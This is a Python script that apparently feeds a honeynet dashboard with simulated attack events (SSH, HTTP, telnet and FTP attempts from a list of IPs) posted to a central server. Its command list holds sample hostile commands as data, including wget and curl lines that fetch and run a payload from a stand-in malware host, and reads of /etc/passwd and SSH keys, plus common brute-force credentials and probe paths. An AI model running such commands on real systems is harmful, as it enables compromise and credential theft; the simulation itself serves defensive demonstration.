"""
Attack Simulator — runs continuously, sending fake attack events to central server.
Deployed on Render as a background worker.
"""

import httpx
import asyncio
import random
import os
from datetime import datetime

CENTRAL_SERVER = os.getenv("CENTRAL_SERVER", "https://honeynet-central.onrender.com")

ATTACKERS = [
    {"ip": "185.220.101.45",  "country": "Russia"},
    {"ip": "103.75.190.12",   "country": "China"},
    {"ip": "45.142.212.100",  "country": "Netherlands"},
    {"ip": "196.235.100.22",  "country": "South Africa"},
    {"ip": "222.186.61.19",   "country": "China"},
    {"ip": "91.240.118.172",  "country": "Ukraine"},
    {"ip": "180.101.88.197",  "country": "China"},
    {"ip": "134.209.82.19",   "country": "USA"},
    {"ip": "62.233.50.11",    "country": "Russia"},
    {"ip": "103.144.209.50",  "country": "Indonesia"},
    {"ip": "45.227.255.191",  "country": "Brazil"},
    {"ip": "159.89.49.100",   "country": "Germany"},
    {"ip": "185.156.73.54",   "country": "Romania"},
    {"ip": "41.223.57.47",    "country": "Nigeria"},
    {"ip": "110.232.117.186", "country": "Bangladesh"},
    {"ip": "5.188.206.26",    "country": "Russia"},
    {"ip": "123.58.182.50",   "country": "China"},
    {"ip": "200.234.177.30",  "country": "Brazil"},
    {"ip": "77.247.181.163",  "country": "Netherlands"},
    {"ip": "103.207.39.120",  "country": "India"},
]

SSH_USERNAMES = ["root", "admin", "ubuntu", "pi", "user", "test", "guest",
                 "oracle", "postgres", "mysql", "ftpuser", "deploy", "ec2-user"]

SSH_PASSWORDS = ["123456", "password", "admin", "root", "12345", "qwerty",
                 "letmein", "monkey", "dragon", "master", "abc123", "pass123",
                 "1234", "admin123", "root123", "toor", "alpine", "raspberry"]

HTTP_PATHS = [
    "/wp-login.php", "/wp-admin/", "/phpmyadmin/", "/admin/",
    "/.env", "/config.php", "/backup.zip", "/shell.php",
    "/.git/config", "/xmlrpc.php", "/administrator/",
    "/login", "/manager/html", "/actuator/env",
]

HTTP_USER_AGENTS = [
    "python-requests/2.28.0", "sqlmap/1.7.8", "Nikto/2.1.6",
    "masscan/1.3.2", "zgrab/0.x", "curl/7.88.1", "Go-http-client/1.1",
]

COMMANDS = [
    "id", "whoami", "uname -a", "cat /etc/passwd",
    "wget http://malware.example.com/bot.sh -O /tmp/b && chmod +x /tmp/b && /tmp/b",
    "curl http://192.168.1.1/payload.sh | sh",
    "ls /", "ps aux", "cat /root/.ssh/authorized_keys",
]

NODE_IDS = ["node-local-01", "node-sg-02", "node-us-03", "node-eu-04"]


def now():
    return datetime.utcnow().isoformat()

def random_port():
    return random.randint(30000, 65000)

def make_event():
    attacker = random.choice(ATTACKERS)
    service = random.choices(
        ["ssh", "ssh", "ssh", "http", "http", "telnet", "telnet", "ftp"],
        k=1
    )[0]

    if service == "ssh":
        return {
            "node_id": random.choice(NODE_IDS),
            "timestamp": now(),
            "attacker_ip": attacker["ip"],
            "attacker_port": random_port(),
            "service": "ssh",
            "event_type": "credential_attempt",
            "data": {"username": random.choice(SSH_USERNAMES),
                     "password": random.choice(SSH_PASSWORDS)},
        }
    elif service == "http":
        is_post = random.random() < 0.3
        return {
            "node_id": random.choice(NODE_IDS),
            "timestamp": now(),
            "attacker_ip": attacker["ip"],
            "attacker_port": random_port(),
            "service": "http",
            "event_type": "credential_attempt" if is_post else "scan_probe",
            "data": {"method": "POST" if is_post else "GET",
                     "path": random.choice(HTTP_PATHS),
                     "user_agent": random.choice(HTTP_USER_AGENTS)},
        }
    elif service == "telnet":
        has_cmd = random.random() < 0.4
        cmd = random.choice(COMMANDS) if has_cmd else None
        return {
            "node_id": random.choice(NODE_IDS),
            "timestamp": now(),
            "attacker_ip": attacker["ip"],
            "attacker_port": random_port(),
            "service": "telnet",
            "event_type": "command_executed" if has_cmd else "credential_attempt",
            "data": {"username": random.choice(SSH_USERNAMES),
                     "password": random.choice(SSH_PASSWORDS),
                     "command": cmd},
            "raw_payload": cmd,
        }
    else:
        return {
            "node_id": random.choice(NODE_IDS),
            "timestamp": now(),
            "attacker_ip": attacker["ip"],
            "attacker_port": random_port(),
            "service": "ftp",
            "event_type": "credential_attempt",
            "data": {"username": random.choice(["anonymous", "admin", "ftp", "root"]),
                     "password": random.choice(SSH_PASSWORDS)},
        }


async def main():
    print(f"[*] Simulator started → {CENTRAL_SERVER}")
    async with httpx.AsyncClient(timeout=15.0) as client:
        while True:
            event = make_event()
            try:
                resp = await client.post(f"{CENTRAL_SERVER}/api/events", json=event)
                print(f"[{event['service'].upper()}] {event['attacker_ip']} → {resp.status_code}")
            except Exception as e:
                print(f"[!] Error: {e}")
            await asyncio.sleep(random.uniform(5, 15))


if __name__ == "__main__":
    asyncio.run(main())
